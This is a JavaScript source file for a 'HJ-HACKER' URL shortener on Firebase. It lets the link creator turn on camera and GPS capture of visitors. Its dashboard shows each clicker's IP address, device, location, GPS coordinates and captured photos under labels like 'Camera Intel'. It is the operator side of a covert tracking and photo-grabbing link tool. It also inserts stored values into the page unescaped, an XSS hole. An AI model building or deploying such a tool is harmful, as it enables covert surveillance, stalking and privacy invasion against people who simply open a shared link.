// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// Main Shorten Function
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try {
        new URL(urlToShorten);
    } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" already taken`, 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    if (hasPassword && !password) {
        showToast('Error', 'Please enter a password', 'error');
        return;
    }
    
    if (hasSocialGate && (!socialTitle || !socialUrl)) {
        showToast('Error', 'Please fill social gate details', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0
        };
        
        if (password) linkData.password = password;
        if (socialTitle) linkData.social_gate_title = socialTitle;
        if (socialUrl) linkData.social_gate_url = socialUrl;
        if (socialIcon) linkData.social_gate_icon = socialIcon;
        if (socialDesc) linkData.social_gate_description = socialDesc;
        if (socialButton) linkData.social_gate_button_text = socialButton;
        if (animation) linkData.animation_type = animation;
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        
        const shortLinkSpan = document.getElementById('shortLink');
        const resultDiv = document.getElementById('result');
        const qrCodeDiv = document.getElementById('qrCode');
        
        if (shortLinkSpan) shortLinkSpan.textContent = shortUrl;
        if (resultDiv) resultDiv.classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined' && qrCodeDiv) {
            qrCodeDiv.innerHTML = '';
            new QRCode(qrCodeDiv, {
                text: shortUrl,
                width: 100,
                height: 100,
                colorDark: "#00ff41",
                colorLight: "#000000"
            });
        }
        
        showToast('Success', 'Link created successfully!', 'success');
        
        // Clear form
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        const passwordSection = document.getElementById('passwordSection');
        const socialSection = document.getElementById('socialSection');
        if (passwordSection) passwordSection.classList.add('hidden');
        if (socialSection) socialSection.classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';
        if (document.getElementById('socialTitle')) document.getElementById('socialTitle').value = '';
        if (document.getElementById('socialUrl')) document.getElementById('socialUrl').value = '';
        if (document.getElementById('socialDesc')) document.getElementById('socialDesc').value = '';
        
        resultDiv?.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// ========== DATA DISPLAY FUNCTIONS ==========

function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

// LINKS - Show all created links
async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p><small>Create your first link above</small></div>');
            return;
        }
        
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code">🔗 /${link.code}</span>
                    <span class="data-item-date">📅 ${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url">${link.long_url?.substring(0, 60)}${link.long_url?.length > 60 ? '...' : ''}</div>
                <div class="data-item-stats">
                    <span>👆 Clicks: ${link.clicks || 0}</span>
                    ${link.password ? '<span>🔒 Password Protected</span>' : ''}
                    ${link.social_gate_url ? '<span>📱 Social Gate</span>' : ''}
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> View Data</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch (error) {
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading links</p></div>');
    }
}

// STATS - Show overall statistics
async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0, totalCamera = 0, totalLocation = 0;
        const linksList = [];
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
            linksList.push({ code, long_url: data.long_url, created_at: data.created_at });
            
            const analyticsSnapshot = await database.ref(`analytics/${code}`).get();
            analyticsSnapshot.forEach(a => {
                if (a.val().captured_image) totalCamera++;
                if (a.val().latitude) totalLocation++;
            });
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label">Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${totalCamera}</div><div class="stat-label">📸 Camera Intel</div></div>
                <div class="stat-card"><div class="stat-value">${totalLocation}</div><div class="stat-label">📍 GPS Intel</div></div>
            </div>
            ${linksList.length > 0 ? `
                <div style="margin-top: 12px;">
                    <p style="font-size: 0.7rem; color: #888; margin-bottom: 8px;">📋 Your Links:</p>
                    ${linksList.map(link => `
                        <div class="data-item" style="margin-bottom: 6px;">
                            <div class="data-item-header">
                                <span class="data-item-code">/${link.code}</span>
                                <span class="data-item-date">${new Date(link.created_at).toLocaleDateString()}</span>
                            </div>
                            <div class="data-item-url" style="font-size: 0.65rem;">${link.long_url?.substring(0, 50)}...</div>
                            <div class="data-item-actions">
                                <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')">View Details</button>
                            </div>
                        </div>
                    `).join('')}
                </div>
            ` : '<div class="empty-data"><p>No links yet. Create one above!</p></div>'}
        `;
        
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch (error) {
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading stats</p></div>');
    }
}

// RECENT - Show recent visitors
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allVisitors = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(20).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                allVisitors.push({
                    code: code,
                    ip: data.ip_address,
                    device: data.device_type,
                    browser: data.browser,
                    timestamp: data.created_at,
                    camera: data.captured_image,
                    location: data.latitude,
                    city: data.city,
                    country: data.country
                });
            });
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 20);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity</p><small>Share your links to see visitor data</small></div>');
            return;
        }
        
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code">🔗 /${v.code}</span>
                    <span class="data-item-date">${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span>🌐 ${v.ip || 'Unknown'}</span>
                    <span>📱 ${v.device || 'Unknown'}</span>
                    <span>🌐 ${v.browser || 'Unknown'}</span>
                </div>
                ${v.city ? `<div class="data-item-stats">📍 ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                ${v.camera ? '<div class="data-item-stats" style="color: #00ff41;">📸 Camera captured!</div>' : ''}
                ${v.location ? '<div class="data-item-stats" style="color: #00ff41;">🎯 GPS Captured!</div>' : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${v.code}')">View Full Data</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch (error) {
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading recent data</p></div>');
    }
}

// View Analytics for specific link
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const analytics = [];
        snapshot.forEach(child => { analytics.push({ id: child.key, ...child.val() }); });
        analytics.reverse();
        
        const linkSnapshot = await database.ref(`urls/${code}`).get();
        const linkData = linkSnapshot.val();
        
        const totalClicks = analytics.length;
        const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
        const cameras = analytics.filter(a => a.captured_image).length;
        const locations = analytics.filter(a => a.latitude).length;
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${uniqueIPs}</div><div class="stat-label">Unique Visitors</div></div>
                <div class="stat-card"><div class="stat-value">${cameras}</div><div class="stat-label">📸 Camera Intel</div></div>
                <div class="stat-card"><div class="stat-value">${locations}</div><div class="stat-label">📍 GPS Tracked</div></div>
            </div>
            <div style="margin-bottom: 12px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 8px;">
                <div style="font-size: 0.7rem;">🔗 Original URL: <span style="color: #888;">${linkData?.long_url || 'N/A'}</span></div>
                ${linkData?.password ? '<div style="font-size: 0.7rem;">🔒 Password Protected</div>' : ''}
                ${linkData?.social_gate_url ? '<div style="font-size: 0.7rem;">📱 Social Gate Enabled</div>' : ''}
            </div>
        `;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet. Share your link!</p></div>';
        } else {
            html += `<h4 style="font-size: 0.75rem; margin: 12px 0 8px;">📋 Visitor Details (${analytics.length} records)</h4>`;
            html += analytics.map(v => `
                <div class="data-item">
                    <div class="data-item-header">
                        <span>🌐 ${v.ip_address || 'Unknown'}</span>
                        <span class="data-item-date">${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats">
                        <span>📱 ${v.device_type || 'Unknown'}</span>
                        <span>🌐 ${v.browser || 'Unknown'}</span>
                    </div>
                    ${v.city ? `<div class="data-item-stats">📍 ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                    ${v.latitude ? `<div class="data-item-stats">🎯 GPS: ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)}</div>` : ''}
                    ${v.captured_image ? `<div class="data-item-stats" style="color: #00ff41;">📸 Camera captured! ${v.captured_image.includes('data:') ? '<a href="' + v.captured_image + '" target="_blank" style="color:#00ff41;"> View Photo</a>' : ''}</div>` : ''}
                </div>
            `).join('');
        }
        
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
        showToast('Success', `Loaded ${analytics.length} visitor records!`, 'success');
    } catch (error) {
        updateDisplay('ANALYTICS ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading analytics</p></div>');
        showToast('Error', 'Failed to load analytics', 'error');
    }
};

// Copy function
window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied to clipboard!', 'success');
};

// Bottom Navigation - ONLY 4 BUTTONS
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click any button to view data', 'fa-fingerprint', 
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap on LINKS, STATS, or RECENT button below</p></div>');
        } else if (tab === 'links') {
            showLinks();
        } else if (tab === 'stats') {
            showStats();
        } else if (tab === 'recent') {
            showRecent();
        }
    });
});

// Toggle handlers
const passwordToggle = document.getElementById('passwordToggle');
if (passwordToggle) {
    passwordToggle.addEventListener('change', (e) => {
        const section = document.getElementById('passwordSection');
        if (section) section.classList.toggle('hidden');
    });
}

const socialToggle = document.getElementById('socialToggle');
if (socialToggle) {
    socialToggle.addEventListener('change', (e) => {
        const section = document.getElementById('socialSection');
        if (section) section.classList.toggle('hidden');
    });
}

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        const socialIconInput = document.getElementById('socialIcon');
        if (socialIconInput) socialIconInput.value = icon.dataset.icon;
    });
});

// Advanced toggle
const advancedToggle = document.getElementById('advancedToggle');
if (advancedToggle) {
    advancedToggle.addEventListener('click', () => {
        const content = document.getElementById('advancedContent');
        const icon = document.querySelector('#advancedToggle .fa-chevron-down');
        if (content) content.classList.toggle('hidden');
        if (icon) icon.style.transform = content?.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
    });
}

// Event listeners
const shortenBtn = document.getElementById('shortenBtn');
if (shortenBtn) shortenBtn.addEventListener('click', shortenUrl);

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        const link = document.getElementById('shortLink')?.textContent;
        if (link) copyToClipboard(link);
    });
}

console.log('🔥 HJ-HACKER Advanced Loaded!');
